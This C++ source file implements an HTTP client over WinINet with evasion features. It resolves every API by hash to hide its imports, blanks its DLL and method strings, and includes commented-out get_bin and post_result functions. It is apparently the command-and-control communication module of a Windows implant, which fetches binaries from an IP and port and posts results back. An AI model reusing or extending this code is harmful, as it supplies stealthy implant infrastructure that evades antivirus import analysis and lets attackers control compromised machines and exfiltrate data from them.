#include "http.h"

/*
#define WININET "Wininet.dll"
#define GET "GET"
#define POST "POST"
#define USERAGENT "UA"
#define ACCEPTED "text/*"
*/

#define WININET ""
#define GET ""
#define POST ""
#define USERAGENT ""
#define ACCEPTED ""

/*
fnInternetCloseHandle pInternetCloseHandle = NULL;
fnInternetReadFile pInternetReadFile = NULL;
fnInternetOpenA pInternetOpenA = NULL;
fnInternetConnectA pInternetConnectA = NULL;
fnHttpOpenRequestA pHttpOpenRequestA = NULL;
fnHttpSendRequestA pHttpSendRequestA = NULL;
*/

HTTP::HTTP(const char* ip, int port, const char* useragent)
{
    this->ip = (char*)malloc(strlen(ip) + 1);
    strcpy(this->ip, ip);
    this->port = port;
    this->useragent = (char*)malloc(strlen(useragent) + 1);
    strcpy(this->useragent, useragent);

    HMODULE kernel32 = GetModuleHandle_byhash(KERNEL32_hash);
    if (kernel32 == NULL)
        return;

    fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)GetProcAddress_byhash(kernel32, LoadLibraryA_hash);

    HMODULE wininet = pLoadLibraryA(WININET);
    if (wininet == NULL)
        return;

    this->pInternetCloseHandle = (fnInternetCloseHandle)GetProcAddress_byhash(wininet, InternetCloseHandle_hash);
    if (this->pInternetCloseHandle == NULL)
        return;
    this->pInternetReadFile = (fnInternetReadFile)GetProcAddress_byhash(wininet, InternetReadFile_hash);
    if (this->pInternetReadFile == NULL)
        return;
    this->pInternetOpenA = (fnInternetOpenA)GetProcAddress_byhash(wininet, InternetOpenA_hash);
    if (this->pInternetOpenA == NULL)
        return;
    this->pInternetConnectA = (fnInternetConnectA)GetProcAddress_byhash(wininet, InternetConnectA_hash);
    if (this->pInternetConnectA == NULL)
        return;
    this->pHttpOpenRequestA = (fnHttpOpenRequestA)GetProcAddress_byhash(wininet, HttpOpenRequestA_hash);
    if (this->pHttpOpenRequestA == NULL)
        return;
    this->pHttpSendRequestA = (fnHttpSendRequestA)GetProcAddress_byhash(wininet, HttpSendRequestA_hash);
    if (this->pHttpSendRequestA == NULL)
        return;

    this->loaded = true;

    return;
}

int HTTP::init_request()
{
    this->hInternet = this->pInternetOpenA(USERAGENT, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0); //you should perhaps edit your useragent ? :p
    if (this->hInternet == NULL)
    {
        return 1;
    }

    this->hConnect = this->pInternetConnectA(this->hInternet, this->ip, this->port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
    if (this->hConnect == NULL)
    {
        return 2;
    }

    return 0;
}

void HTTP::cleanup_request()
{
    if (this->hRequest != NULL)
        this->pInternetCloseHandle(this->hRequest);
    if (this->hConnect != NULL)
        this->pInternetCloseHandle(this->hConnect);
    if (this->hInternet != NULL)
        this->pInternetCloseHandle(this->hInternet);

    this->hRequest = NULL;
    this->hConnect = NULL;
    this->hInternet = NULL;
}

int HTTP::get(const char* path, char** output, size_t* output_size)
{
    const char* parrAcceptTypes[] = { ACCEPTED, NULL }; // accepted types. We'll choose text.
    BOOL bRequestSent = FALSE;

    int return_value = this->init_request();
    if (return_value != 0)
        goto cleanup;

    this->hRequest = this->pHttpOpenRequestA(this->hConnect, GET, path, NULL, NULL, parrAcceptTypes, INTERNET_FLAG_DONT_CACHE, 0);

    if (this->hRequest == NULL)
    {
        return_value = 3;
        goto cleanup;
    }

    bRequestSent = this->pHttpSendRequestA(this->hRequest, NULL, 0, NULL, 0);
    if (!bRequestSent)
    {
        return_value = 4;
        goto cleanup;
    }

    return_value = this->get_response_content(this->hRequest, output, output_size);

cleanup:
    this->cleanup_request();

    return return_value;

}

int HTTP::post(const char* path, const char* data, size_t data_size, char** output, size_t* output_size)
{
    const char* parrAcceptTypes[] = { ACCEPTED, NULL }; // accepted types. We'll choose text.
    BOOL bRequestSent = FALSE;

    int return_value = this->init_request();
    if (return_value != 0)
        goto cleanup;

    this->hRequest = this->pHttpOpenRequestA(this->hConnect, POST, path, NULL, NULL, parrAcceptTypes, 0, 0);

    if (this->hRequest == NULL)
    {
        return_value = 3;
        goto cleanup;
    }

    bRequestSent = this->pHttpSendRequestA(this->hRequest, NULL, 0, (LPVOID)data, data_size);

    if (!bRequestSent)
    {
        return_value = 4;
        goto cleanup;
    }

    return_value = this->get_response_content(this->hRequest, output, output_size);

cleanup:
    this->cleanup_request();

    return return_value;
}

int HTTP::get_response_content(HINTERNET hRequest, char** output, size_t* output_size)
{
    const int nBuffSize = 1024;
    char buff[nBuffSize];
    BOOL bKeepReading = true;
    DWORD dwBytesRead = -1;
    char* tmp = NULL;

    *output = (char*)malloc(1);
    *output_size = 0;

    while (bKeepReading && dwBytesRead != 0)
    {
        bKeepReading = this->pInternetReadFile(hRequest, buff, nBuffSize, &dwBytesRead);

        tmp = (char*)realloc(*output, *output_size + dwBytesRead + 1);
        if (tmp != NULL)
        {
            *output = tmp;
        }
        else
        {
            free(*output);
            *output_size = 0;

            return 5;
        }

        memcpy(*output + *output_size, buff, dwBytesRead);

        *output_size += dwBytesRead;
    }

    return 0;
}

bool HTTP::load_success()
{
    return this->loaded;
}


/*
bool init_wininet()
{
    HMODULE kernel32 = GetModuleHandle_byhash(KERNEL32_hash);
    if (kernel32 == NULL)
        return false;

    fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)GetProcAddress_byhash(kernel32, LoadLibraryA_hash);

    HMODULE wininet = pLoadLibraryA(WININET);
    if (wininet == NULL)
        return false;

    pInternetCloseHandle = (fnInternetCloseHandle)GetProcAddress_byhash(wininet, InternetCloseHandle_hash);
    pInternetReadFile = (fnInternetReadFile)GetProcAddress_byhash(wininet, InternetReadFile_hash);
    pInternetOpenA = (fnInternetOpenA)GetProcAddress_byhash(wininet, InternetOpenA_hash);
    pInternetConnectA = (fnInternetConnectA)GetProcAddress_byhash(wininet, InternetConnectA_hash);
    pHttpOpenRequestA = (fnHttpOpenRequestA)GetProcAddress_byhash(wininet, HttpOpenRequestA_hash);
    pHttpSendRequestA = (fnHttpSendRequestA)GetProcAddress_byhash(wininet, HttpSendRequestA_hash);


    return true;
}
*/
/*
int get_bin(const char* ip, int port, const char* path, char** output, size_t* output_size)
{
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    const char* parrAcceptTypes[] = { ACCEPTED, NULL }; // accepted types. We'll choose text.
    BOOL bRequestSent = FALSE;
    int return_value = 0;

    // INTERNET_OPEN_TYPE_DIRECT
    hInternet = pInternetOpenA(USERAGENT, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0); //you should perhaps edit your useragent ? :p

    if (hInternet == NULL)
    {
        return_value = 1;
        goto cleanup;
    }
    
    hConnect = pInternetConnectA(hInternet, ip, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);

    if (hConnect == NULL)
    {
        return_value = 2;

        goto cleanup;
    }

    hRequest = pHttpOpenRequestA(hConnect, GET, path, NULL, NULL, parrAcceptTypes, INTERNET_FLAG_DONT_CACHE, 0);

    if (hRequest == NULL)
    {
        return_value = 3;
        
        goto cleanup;
    }

    bRequestSent = pHttpSendRequestA(hRequest, NULL, 0, NULL, 0);

    if (!bRequestSent)
    {
        return_value = 4;

        goto cleanup;
    }

    return_value = get_response_content(hRequest, output, output_size);
    
    cleanup:
    if (hRequest != NULL)
        pInternetCloseHandle(hRequest);
    if (hConnect != NULL)
        pInternetCloseHandle(hConnect);
    if (hInternet != NULL)
        pInternetCloseHandle(hInternet);
    
    return return_value;
    
}

int post_result(const char* ip, int port, const char* path, const char* data, size_t data_size, char** output, size_t* output_size)
{
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    const char* parrAcceptTypes[] = { ACCEPTED, NULL }; // accepted types. We'll choose text.
    BOOL bRequestSent = FALSE;
    int return_value = 0;

    hInternet = pInternetOpenA(USERAGENT, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0); //you should perhaps edit your useragent ? :p

    if (hInternet == NULL)
    {
        return_value = 1;

        goto cleanup;
    }

    hConnect = pInternetConnectA(hInternet, ip, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);

    if (hConnect == NULL)
    {
        return_value = 2;
        goto cleanup;
    }

    hRequest = pHttpOpenRequestA(hConnect, POST, path, NULL, NULL, parrAcceptTypes, 0, 0);

    if (hRequest == NULL)
    {
        return_value = 3;
        goto cleanup;
    }

    bRequestSent = pHttpSendRequestA(hRequest, NULL, 0, (LPVOID)data, data_size);

    if (!bRequestSent)
    {
        return_value = 4;
        goto cleanup;
    }

    return_value = get_response_content(hRequest, output, output_size);

cleanup:
    if (hRequest != NULL)
        pInternetCloseHandle(hRequest);
    if (hConnect != NULL)
        pInternetCloseHandle(hConnect);
    if (hInternet != NULL)
        pInternetCloseHandle(hInternet);

    return return_value;
}

int get_response_content(HINTERNET hRequest, char** output, size_t* output_size)
{
    const int nBuffSize = 1024;
    char buff[nBuffSize];
    BOOL bKeepReading = true;
    DWORD dwBytesRead = -1;
    char* tmp = NULL;

    *output = (char*)malloc(1);
    *output_size = 0;

    while (bKeepReading && dwBytesRead != 0)
    {
        bKeepReading = pInternetReadFile(hRequest, buff, nBuffSize, &dwBytesRead);

        tmp = (char*)realloc(*output, *output_size + dwBytesRead + 1);
        if (tmp != NULL)
        {
            *output = tmp;
        }
        else
        {
            free(*output);
            *output_size = 0;

            return 5;
        }

        memcpy(*output + *output_size, buff, dwBytesRead);

        *output_size += dwBytesRead;
    }

    return 0;
}
*/